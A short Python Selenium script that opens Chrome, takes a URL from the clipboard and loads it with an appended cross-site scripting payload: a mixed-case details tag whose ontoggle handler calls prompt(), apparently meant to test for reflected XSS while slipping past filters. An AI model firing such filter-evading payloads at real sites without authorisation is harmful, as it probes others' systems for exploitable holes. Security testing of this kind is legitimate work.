from selenium import webdriver
import os
import pyperclip as pc
driver = webdriver.Chrome(executable_path="4.exe")
driver.maximize_window()
driver.get("{}<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>".format(pc.paste()))
